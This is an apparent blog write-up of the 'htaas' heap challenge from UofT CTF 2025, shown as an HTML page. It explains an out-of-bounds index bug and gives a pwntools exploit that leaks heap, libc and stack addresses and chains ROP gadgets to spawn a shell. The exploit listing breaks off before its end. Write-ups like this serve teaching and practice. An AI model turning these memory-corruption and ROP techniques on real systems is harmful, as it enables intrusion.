@@ -1,0 +1,495 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <title>
+  htaas - UofT CTF 2025 · bitfriends&#39; blog
+</title>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="color-scheme" content="light dark">
+
+
+
+
+<meta name="author" content="bitfriends">
+<meta name="description" content="OOB in hashtables leads to arbitrary code execution">
+<meta name="keywords" content="blog,reseacher,personal">
+
+
+
+	<meta name="twitter:card" content="summary">
+	<meta name="twitter:title" content="htaas - UofT CTF 2025">
+	<meta name="twitter:description" content="OOB in hashtables leads to arbitrary code execution">
+
+<meta property="og:url" content="http://localhost:1313/posts/uoft_htaas/">
+	<meta property="og:site_name" content="bitfriends&#39; blog">
+	<meta property="og:title" content="htaas - UofT CTF 2025">
+	<meta property="og:description" content="OOB in hashtables leads to arbitrary code execution">
+	<meta property="og:locale" content="en">
+	<meta property="og:type" content="article">
+		<meta property="article:section" content="posts">
+		<meta property="article:published_time" content="2025-01-15T19:58:53+01:00">
+		<meta property="article:modified_time" content="2025-01-15T19:58:53+01:00">
+		<meta property="article:tag" content="Linux">
+		<meta property="article:tag" content="Oob">
+
+
+
+
+<link rel="canonical" href="http://localhost:1313/posts/uoft_htaas/">
+
+
+<link rel="preload" href="/fonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin>
+
+
+  
+  
+  <link rel="stylesheet" href="/css/coder.css" media="screen">
+
+
+
+
+
+
+  
+    
+    
+    <link rel="stylesheet" href="/css/coder-dark.css" media="screen">
+  
+
+
+
+ 
+
+
+
+
+<link rel="icon" type="image/svg+xml" href="/img/favicon.svg" sizes="any">
+<link rel="icon" type="image/png" href="/img/favicon-32x32.png" sizes="32x32">
+<link rel="icon" type="image/png" href="/img/favicon-16x16.png" sizes="16x16">
+
+<link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
+<link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="manifest" href="/site.webmanifest">
+<link rel="mask-icon" href="/images/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+
+
+
+
+
+
+
+</head>
+
+
+
+
+
+
+<body class="preload-transitions colorscheme-auto">
+  
+<div class="float-container">
+    <a id="dark-mode-toggle" class="colorscheme-toggle">
+        <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+    </a>
+</div>
+
+
+  <main class="wrapper">
+    <nav class="navigation">
+  <section class="container">
+    
+    <a class="navigation-title" href="http://localhost:1313/">
+      bitfriends&#39; blog
+    </a>
+    
+    
+      <input type="checkbox" id="menu-toggle" />
+      <label class="menu-button float-right" for="menu-toggle">
+        <i class="fa-solid fa-bars fa-fw" aria-hidden="true"></i>
+      </label>
+      <ul class="navigation-list">
+        
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/posts/">Blog</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/posts/about/">About</a>
+            </li>
+          
+        
+        
+      </ul>
+    
+  </section>
+</nav>
+
+
+    <div class="content">
+      
+  <section class="container post">
+    <article>
+      <header>
+        <div class="post-title">
+          <h1 class="title">
+            <a class="title-link" href="http://localhost:1313/posts/uoft_htaas/">
+              htaas - UofT CTF 2025
+            </a>
+          </h1>
+        </div>
+        <div class="post-meta">
+          <div class="date">
+            <span class="posted-on">
+              <i class="fa-solid fa-calendar" aria-hidden="true"></i>
+              <time datetime="2025-01-15T19:58:53&#43;01:00">
+                January 15, 2025
+              </time>
+            </span>
+            <span class="reading-time">
+              <i class="fa-solid fa-clock" aria-hidden="true"></i>
+              5-minute read
+            </span>
+          </div>
+          <div class="authors">
+  <i class="fa-solid fa-user" aria-hidden="true"></i>
+    <a href="/authors/bitfriends/">Bitfriends</a></div>
+
+          <div class="categories">
+  <i class="fa-solid fa-folder" aria-hidden="true"></i>
+    <a href="/categories/ctf/">Ctf</a></div>
+
+          <div class="tags">
+  <i class="fa-solid fa-tag" aria-hidden="true"></i>
+    <span class="tag">
+      <a href="/tags/linux/">Linux</a>
+    </span>
+      <span class="separator">•</span>
+    <span class="tag">
+      <a href="/tags/oob/">Oob</a>
+    </span></div>
+
+        </div>
+      </header>
+
+      
+
+
+      <div class="post-content">
+        
+        <p>While playing UofTCTF I solved hash table as a service (htaas).
+We were given a simple heap menu, which lets us create, get and set hash table entries:</p>
+<pre tabindex="0"><code>1. New Hash Table
+2. Set
+3. Get
+4. Exit
+&gt; 
+</code></pre><p>Upon inspecting the source, we spot some interesting things. There is an array that contains <code>hashTable</code>s,
+i.e. it contains the number of entries in the hash table and its start address:</p>
+<pre tabindex="0"><code>0x5c1e1caad040 &lt;hashTables&gt;:	0x0000000000000010	0x00005c1e4f4072a0
+0x5c1e1caad050 &lt;hashTables+16&gt;:	0x0000000000000000	0x0000000000000000
+...
+</code></pre><p>Each <code>hashTable</code> consits of <code>n</code> entries, which look like this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ff7b72">struct</span> entry {
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">int</span> idx;
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">char</span> value[<span style="color:#a5d6ff">8</span>];
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Now that the structures are clear, we can look at the bugs. There is clearly a missing check
+in get and set functionality on the index for a hash table. In theory it can be any value:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#d2a8ff;font-weight:bold">printf</span>(<span style="color:#a5d6ff">&#34;Index: &#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#d2a8ff;font-weight:bold">__isoc99_scanf</span>(<span style="color:#a5d6ff">&#34;%d&#34;</span>, <span style="color:#ff7b72;font-weight:bold">&amp;</span>v4);
+</span></span><span style="display:flex;"><span><span style="color:#d2a8ff;font-weight:bold">printf</span>(<span style="color:#a5d6ff">&#34;Key: &#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#d2a8ff;font-weight:bold">__isoc99_scanf</span>(<span style="color:#a5d6ff">&#34;%d&#34;</span>, <span style="color:#ff7b72;font-weight:bold">&amp;</span>v5);
+</span></span><span style="display:flex;"><span>HashTable <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#d2a8ff;font-weight:bold">getHashTable</span>((<span style="color:#ff7b72">char</span> <span style="color:#ff7b72;font-weight:bold">*</span>)<span style="color:#ff7b72;font-weight:bold">&amp;</span>hashTables <span style="color:#ff7b72;font-weight:bold">+</span> <span style="color:#a5d6ff">16</span> <span style="color:#ff7b72;font-weight:bold">*</span> (<span style="color:#ff7b72">int</span>)v4, v5);
+</span></span></code></pre></div><p>However we are limited by the method of retrieving the <code>HashTable</code> in <code>getHashTable</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ff7b72">__int64</span> <span style="color:#ff7b72">__fastcall</span> <span style="color:#d2a8ff;font-weight:bold">getHashTable</span>(_QWORD <span style="color:#ff7b72;font-weight:bold">*</span>entry, <span style="color:#ff7b72">int</span> key)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#ff7b72">unsigned</span> <span style="color:#ff7b72">__int64</span> v3; <span style="color:#8b949e;font-style:italic">// [rsp+10h] [rbp-10h]
+</span></span></span><span style="display:flex;"><span>  <span style="color:#ff7b72">__int64</span> v4; <span style="color:#8b949e;font-style:italic">// [rsp+18h] [rbp-8h]
+</span></span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  v3 <span style="color:#ff7b72;font-weight:bold">=</span> (<span style="color:#ff7b72">unsigned</span> <span style="color:#ff7b72">__int64</span>)key <span style="color:#ff7b72;font-weight:bold">%</span> <span style="color:#ff7b72;font-weight:bold">*</span>entry;
+</span></span><span style="display:flex;"><span>  v4 <span style="color:#ff7b72;font-weight:bold">=</span> entry[<span style="color:#a5d6ff">1</span>];
+</span></span><span style="display:flex;"><span>  <span style="color:#ff7b72">while</span> ( key <span style="color:#ff7b72;font-weight:bold">!=</span> <span style="color:#ff7b72;font-weight:bold">*</span>(_DWORD <span style="color:#ff7b72;font-weight:bold">*</span>)(<span style="color:#a5d6ff">12</span> <span style="color:#ff7b72;font-weight:bold">*</span> v3 <span style="color:#ff7b72;font-weight:bold">+</span> v4) <span style="color:#ff7b72;font-weight:bold">&amp;&amp;</span> <span style="color:#d2a8ff;font-weight:bold">memcmp</span>(<span style="color:#ff7b72;font-weight:bold">&amp;</span>empty, (<span style="color:#ff7b72">const</span> <span style="color:#ff7b72">void</span> <span style="color:#ff7b72;font-weight:bold">*</span>)(<span style="color:#a5d6ff">12</span> <span style="color:#ff7b72;font-weight:bold">*</span> v3 <span style="color:#ff7b72;font-weight:bold">+</span> v4), <span style="color:#a5d6ff">0xCuLL</span>) )
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72;font-weight:bold">++</span>v3;
+</span></span><span style="display:flex;"><span>  <span style="color:#ff7b72">return</span> <span style="color:#a5d6ff">12</span> <span style="color:#ff7b72;font-weight:bold">*</span> v3 <span style="color:#ff7b72;font-weight:bold">+</span> v4;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Any malicious data we reach with a negative index for example have to satisfy following conditions:</p>
+<ul>
+<li><code>*entry</code> has to contain a valid hash table size</li>
+<li><code>*entry+8</code> has to contain a valid pointer
+It was pretty difficult to find a valid target around the <code>hashTable</code> array, but there was something:</li>
+</ul>
+<pre tabindex="0"><code>0x5c1e1caacd70:	0x00005c1e1caaa260	0x00005c1e1caaa220
+</code></pre><p>This will satisfy the conditions above. Since value at <code>*entry</code> is so large, <code>v3</code> will be the same as <code>key</code>.
+That will require the <code>key</code> of the hash table me the same as its offset to the beginning in
+order to receive an entry. This seems pretty specific, but can be achieved in the <code>hashTable</code>
+array, since we can freely control the number of entries in a <code>hashTable</code>. Upon carefully crafting a negative index and size for a hash table we come up with this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-py" data-lang="py"><span style="display:flex;"><span>create(<span style="color:#a5d6ff">0</span>, <span style="color:#a5d6ff">0x3d8</span>)
+</span></span><span style="display:flex;"><span>set_map(<span style="color:#ff7b72;font-weight:bold">-</span><span style="color:#a5d6ff">45</span>, <span style="color:#a5d6ff">0x3d8</span>, <span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;AAAAAAAA&#34;</span>)
+</span></span><span style="display:flex;"><span>get_map(<span style="color:#ff7b72;font-weight:bold">-</span><span style="color:#a5d6ff">45</span>, <span style="color:#a5d6ff">0x3d8</span>)
+</span></span></code></pre></div><p>This will let us control 4 bytes of the pointer to <code>hashTable</code> entries:</p>
+<pre tabindex="0"><code>0x5736c7f82040 &lt;hashTables&gt;:	0x41414141000003d8	0x0000573641414141
+</code></pre><p>Now we can have (heap) OOB writes, since if an address contains <code>0xc</code> null bytes, we can
+write to it no matter the key. However to get arbitrary reads, a valid <code>key</code> has to be preceeding
+the value.</p>
+<p>Luckily we have enough control on the heap, so I decided to corrupt the top chunk and prepare
+a proper key in front of libc addresses to be leaked. This leaks a libc address:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-py" data-lang="py"><span style="display:flex;"><span>heap <span style="color:#ff7b72;font-weight:bold">=</span> u64(p<span style="color:#ff7b72;font-weight:bold">.</span>recvuntil(<span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;&gt;&#34;</span>)[:<span style="color:#ff7b72;font-weight:bold">-</span><span style="color:#a5d6ff">1</span>]<span style="color:#ff7b72;font-weight:bold">.</span>ljust(<span style="color:#a5d6ff">8</span>, <span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;</span><span style="color:#79c0ff">\x00</span><span style="color:#a5d6ff">&#34;</span>))
+</span></span><span style="display:flex;"><span>target <span style="color:#ff7b72;font-weight:bold">=</span> heap <span style="color:#ff7b72;font-weight:bold">+</span> <span style="color:#a5d6ff">0x2df8</span>
+</span></span><span style="display:flex;"><span>target2 <span style="color:#ff7b72;font-weight:bold">=</span> target <span style="color:#ff7b72;font-weight:bold">+</span> <span style="color:#a5d6ff">0x8</span>
+</span></span><span style="display:flex;"><span>target3 <span style="color:#ff7b72;font-weight:bold">=</span> target2 <span style="color:#ff7b72;font-weight:bold">+</span> <span style="color:#a5d6ff">0x8</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>set_map(<span style="color:#ff7b72;font-weight:bold">-</span><span style="color:#a5d6ff">45</span>, <span style="color:#a5d6ff">0x3d8</span>, <span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;AAAA&#34;</span> <span style="color:#ff7b72;font-weight:bold">+</span> p32(target))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>set_map(<span style="color:#a5d6ff">0</span>, <span style="color:#a5d6ff">3</span>, p64(<span style="color:#a5d6ff">0x300000000</span>))
+</span></span><span style="display:flex;"><span>set_map(<span style="color:#ff7b72;font-weight:bold">-</span><span style="color:#a5d6ff">45</span>, <span style="color:#a5d6ff">0x3d8</span>, <span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;AAAA&#34;</span> <span style="color:#ff7b72;font-weight:bold">+</span> p32(target2))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>set_map(<span style="color:#a5d6ff">0</span>, <span style="color:#a5d6ff">3</span>, p64(<span style="color:#a5d6ff">0xf41</span>))
+</span></span><span style="display:flex;"><span>create(<span style="color:#a5d6ff">1</span>, <span style="color:#a5d6ff">0x3d8</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>set_map(<span style="color:#a5d6ff">0</span>, <span style="color:#a5d6ff">3</span>, p64(<span style="color:#a5d6ff">0x300000000</span>))
+</span></span><span style="display:flex;"><span>set_map(<span style="color:#ff7b72;font-weight:bold">-</span><span style="color:#a5d6ff">45</span>, <span style="color:#a5d6ff">0x3d8</span>, <span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;AAAA&#34;</span> <span style="color:#ff7b72;font-weight:bold">+</span> p32(target3))
+</span></span><span style="display:flex;"><span>get_map(<span style="color:#a5d6ff">0</span>, <span style="color:#a5d6ff">3</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#ff7b72;font-weight:bold">.</span>recvuntil(<span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;Value: &#34;</span>)
+</span></span><span style="display:flex;"><span>libc <span style="color:#ff7b72;font-weight:bold">=</span> u64(p<span style="color:#ff7b72;font-weight:bold">.</span>recvuntil(<span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;&gt;&#34;</span>)[:<span style="color:#ff7b72;font-weight:bold">-</span><span style="color:#a5d6ff">1</span>]<span style="color:#ff7b72;font-weight:bold">.</span>ljust(<span style="color:#a5d6ff">8</span>, <span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;</span><span style="color:#79c0ff">\x00</span><span style="color:#a5d6ff">&#34;</span>))
+</span></span></code></pre></div><p>Because of the new libc I decided to corrupt the stack. To retrieve a stack leak, I wrote
+some correct index right before <code>environ</code> and was able to leak it:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-py" data-lang="py"><span style="display:flex;"><span>before_environ <span style="color:#ff7b72;font-weight:bold">=</span> libc_base <span style="color:#ff7b72;font-weight:bold">+</span> <span style="color:#a5d6ff">0x20ad40</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>set_map(<span style="color:#ff7b72;font-weight:bold">-</span><span style="color:#a5d6ff">45</span>, <span style="color:#a5d6ff">0x3db</span>, p64(before_environ))
+</span></span><span style="display:flex;"><span>set_map(<span style="color:#a5d6ff">2</span>, <span style="color:#a5d6ff">1</span>, p64(<span style="color:#a5d6ff">0x200000000</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>set_map(<span style="color:#ff7b72;font-weight:bold">-</span><span style="color:#a5d6ff">45</span>, <span style="color:#a5d6ff">0x3db</span>, p64(before_environ<span style="color:#ff7b72;font-weight:bold">-</span><span style="color:#a5d6ff">0x4</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>get_map(<span style="color:#a5d6ff">2</span>, <span style="color:#a5d6ff">2</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#ff7b72;font-weight:bold">.</span>recvuntil(<span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;Value: &#34;</span>)
+</span></span><span style="display:flex;"><span>stack <span style="color:#ff7b72;font-weight:bold">=</span> u64(p<span style="color:#ff7b72;font-weight:bold">.</span>recvuntil(<span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;&gt;&#34;</span>)[:<span style="color:#ff7b72;font-weight:bold">-</span><span style="color:#a5d6ff">1</span>]<span style="color:#ff7b72;font-weight:bold">.</span>ljust(<span style="color:#a5d6ff">8</span>, <span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;</span><span style="color:#79c0ff">\x00</span><span style="color:#a5d6ff">&#34;</span>))
+</span></span></code></pre></div><p>We&rsquo;re lucky, since the <code>key</code> right before the saved return address contains <code>0x7fff</code>, which
+is valid (and actually the uper 32-bits of saved <code>rbp</code>). With that we can prepare the stack
+to be able to write more data to it and hold our ropchain. We get a shell:</p>
+<pre tabindex="0"><code>[+] Starting local process &#39;./chall&#39;: pid 1991
+0x34a4e2a0
+0x7a3224400000
+0x7ffe4e495508
+[*] Switching to interactive mode
+ $ ls
+Dockerfile  chall.id0  chall.id2  chall.til		libc.so.6  x.py
+chall	    chall.id1  chall.nam  ld-linux-x86-64.so.2	run
+$ 
+</code></pre><p>The full exploit is:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#ff7b72">from</span> <span style="color:#ff7b72">pwn</span> <span style="color:#ff7b72">import</span> <span style="color:#ff7b72;font-weight:bold">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">def</span> <span style="color:#d2a8ff;font-weight:bold">create</span>(idx, sz):
+</span></span><span style="display:flex;"><span>    p<span style="color:#ff7b72;font-weight:bold">.</span>sendlineafter(<span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;&gt;&#34;</span>, <span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;1&#34;</span>)
+</span></span><span style="display:flex;"><span>    p<span style="color:#ff7b72;font-weight:bold">.</span>sendlineafter(<span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;Index&#34;</span>, str(idx)<span style="color:#ff7b72;font-weight:bold">.</span>encode())
+</span></span><span style="display:flex;"><span>    p<span style="color:#ff7b72;font-weight:bold">.</span>sendlineafter(<span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;Size&#34;</span>, str(sz)<span style="color:#ff7b72;font-weight:bold">.</span>encode())
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">def</span> <span style="color:#d2a8ff;font-weight:bold">set_map</span>(idx, key, value):
+</span></span><span style="display:flex;"><span>    p<span style="color:#ff7b72;font-weight:bold">.</span>sendlineafter(<span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;&gt;&#34;</span>, <span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;2&#34;</span>)
+</span></span><span style="display:flex;"><span>    p<span style="color:#ff7b72;font-weight:bold">.</span>sendlineafter(<span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;Index&#34;</span>, str(idx)<span style="color:#ff7b72;font-weight:bold">.</span>encode())
+</span></span><span style="display:flex;"><span>    p<span style="color:#ff7b72;font-weight:bold">.</span>sendlineafter(<span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;Key&#34;</span>, str(key)<span style="color:#ff7b72;font-weight:bold">.</span>encode())
+</span></span><span style="display:flex;"><span>    p<span style="color:#ff7b72;font-weight:bold">.</span>sendafter(<span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;Value&#34;</span>, value)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">def</span> <span style="color:#d2a8ff;font-weight:bold">get_map</span>(idx, key):
+</span></span><span style="display:flex;"><span>    p<span style="color:#ff7b72;font-weight:bold">.</span>sendlineafter(<span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;&gt;&#34;</span>, <span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;3&#34;</span>)
+</span></span><span style="display:flex;"><span>    p<span style="color:#ff7b72;font-weight:bold">.</span>sendlineafter(<span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;Index&#34;</span>, str(idx)<span style="color:#ff7b72;font-weight:bold">.</span>encode())
+</span></span><span style="display:flex;"><span>    p<span style="color:#ff7b72;font-weight:bold">.</span>sendlineafter(<span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;Key&#34;</span>, str(key)<span style="color:#ff7b72;font-weight:bold">.</span>encode())
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">#p = process(&#34;./chall&#34;)</span>
+</span></span><span style="display:flex;"><span>p <span style="color:#ff7b72;font-weight:bold">=</span> remote(<span style="color:#a5d6ff">&#34;34.162.33.160&#34;</span>, <span style="color:#a5d6ff">5000</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>create(<span style="color:#a5d6ff">0</span>, <span style="color:#a5d6ff">0x3d8</span>)
+</span></span><span style="display:flex;"><span>set_map(<span style="color:#ff7b72;font-weight:bold">-</span><span style="color:#a5d6ff">45</span>, <span style="color:#a5d6ff">0x3d8</span>, <span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;AAAA&#34;</span>)
+</span></span><span style="display:flex;"><span>get_map(<span style="color:#ff7b72;font-weight:bold">-</span><span style="color:#a5d6ff">45</span>, <span style="color:#a5d6ff">0x3d8</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#ff7b72;font-weight:bold">.</span>recvuntil(<span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;AAAA&#34;</span>)
+</span></span><span style="display:flex;"><span>heap <span style="color:#ff7b72;font-weight:bold">=</span> u64(p<span style="color:#ff7b72;font-weight:bold">.</span>recvuntil(<span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;&gt;&#34;</span>)[:<span style="color:#ff7b72;font-weight:bold">-</span><span style="color:#a5d6ff">1</span>]<span style="color:#ff7b72;font-weight:bold">.</span>ljust(<span style="color:#a5d6ff">8</span>, <span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;</span><span style="color:#79c0ff">\x00</span><span style="color:#a5d6ff">&#34;</span>))
+</span></span><span style="display:flex;"><span>target <span style="color:#ff7b72;font-weight:bold">=</span> heap <span style="color:#ff7b72;font-weight:bold">+</span> <span style="color:#a5d6ff">0x2df8</span>
+</span></span><span style="display:flex;"><span>target2 <span style="color:#ff7b72;font-weight:bold">=</span> target <span style="color:#ff7b72;font-weight:bold">+</span> <span style="color:#a5d6ff">0x8</span>
+</span></span><span style="display:flex;"><span>target3 <span style="color:#ff7b72;font-weight:bold">=</span> target2 <span style="color:#ff7b72;font-weight:bold">+</span> <span style="color:#a5d6ff">0x8</span>
+</span></span><span style="display:flex;"><span>print(hex(heap))
+</span></span><span style="display:flex;"><span>p<span style="color:#ff7b72;font-weight:bold">.</span>unrecv(<span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;&gt;&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>set_map(<span style="color:#ff7b72;font-weight:bold">-</span><span style="color:#a5d6ff">45</span>, <span style="color:#a5d6ff">0x3d8</span>, <span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;AAAA&#34;</span> <span style="color:#ff7b72;font-weight:bold">+</span> p32(target))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>set_map(<span style="color:#a5d6ff">0</span>, <span style="color:#a5d6ff">3</span>, p64(<span style="color:#a5d6ff">0x300000000</span>))
+</span></span><span style="display:flex;"><span>set_map(<span style="color:#ff7b72;font-weight:bold">-</span><span style="color:#a5d6ff">45</span>, <span style="color:#a5d6ff">0x3d8</span>, <span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;AAAA&#34;</span> <span style="color:#ff7b72;font-weight:bold">+</span> p32(target2))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>set_map(<span style="color:#a5d6ff">0</span>, <span style="color:#a5d6ff">3</span>, p64(<span style="color:#a5d6ff">0xf41</span>))
+</span></span><span style="display:flex;"><span>create(<span style="color:#a5d6ff">1</span>, <span style="color:#a5d6ff">0x3d8</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>set_map(<span style="color:#a5d6ff">0</span>, <span style="color:#a5d6ff">3</span>, p64(<span style="color:#a5d6ff">0x300000000</span>))
+</span></span><span style="display:flex;"><span>set_map(<span style="color:#ff7b72;font-weight:bold">-</span><span style="color:#a5d6ff">45</span>, <span style="color:#a5d6ff">0x3d8</span>, <span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;AAAA&#34;</span> <span style="color:#ff7b72;font-weight:bold">+</span> p32(target3))
+</span></span><span style="display:flex;"><span>get_map(<span style="color:#a5d6ff">0</span>, <span style="color:#a5d6ff">3</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#ff7b72;font-weight:bold">.</span>recvuntil(<span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;Value: &#34;</span>)
+</span></span><span style="display:flex;"><span>libc <span style="color:#ff7b72;font-weight:bold">=</span> u64(p<span style="color:#ff7b72;font-weight:bold">.</span>recvuntil(<span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;&gt;&#34;</span>)[:<span style="color:#ff7b72;font-weight:bold">-</span><span style="color:#a5d6ff">1</span>]<span style="color:#ff7b72;font-weight:bold">.</span>ljust(<span style="color:#a5d6ff">8</span>, <span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;</span><span style="color:#79c0ff">\x00</span><span style="color:#a5d6ff">&#34;</span>))
+</span></span><span style="display:flex;"><span>libc_base <span style="color:#ff7b72;font-weight:bold">=</span> libc <span style="color:#ff7b72;font-weight:bold">-</span> <span style="color:#a5d6ff">0x203b20</span>
+</span></span><span style="display:flex;"><span>before_environ <span style="color:#ff7b72;font-weight:bold">=</span> libc_base <span style="color:#ff7b72;font-weight:bold">+</span> <span style="color:#a5d6ff">0x20ad40</span>
+</span></span><span style="display:flex;"><span>system <span style="color:#ff7b72;font-weight:bold">=</span> libc_base <span style="color:#ff7b72;font-weight:bold">+</span> <span style="color:#a5d6ff">0x58740</span>
+</span></span><span style="display:flex;"><span>binsh <span style="color:#ff7b72;font-weight:bold">=</span> libc_base <span style="color:#ff7b72;font-weight:bold">+</span> <span style="color:#a5d6ff">0x1cb42f</span>
+</span></span><span style="display:flex;"><span>pop_rdi <span style="color:#ff7b72;font-weight:bold">=</span> libc_base <span style="color:#ff7b72;font-weight:bold">+</span> <span style="color:#a5d6ff">0x10f75b</span>
+</span></span><span style="display:flex;"><span>ret <span style="color:#ff7b72;font-weight:bold">=</span> libc_base <span style="color:#ff7b72;font-weight:bold">+</span> <span style="color:#a5d6ff">0x2882f</span>
+</span></span><span style="display:flex;"><span>print(hex(libc_base))
+</span></span><span style="display:flex;"><span>p<span style="color:#ff7b72;font-weight:bold">.</span>unrecv(<span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;&gt;&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>set_map(<span style="color:#ff7b72;font-weight:bold">-</span><span style="color:#a5d6ff">45</span>, <span style="color:#a5d6ff">0x3db</span>, p64(before_environ))
+</span></span><span style="display:flex;"><span>set_map(<span style="color:#a5d6ff">2</span>, <span style="color:#a5d6ff">1</span>, p64(<span style="color:#a5d6ff">0x200000000</span>))
+</span></span><span style="display:flex;"><span>
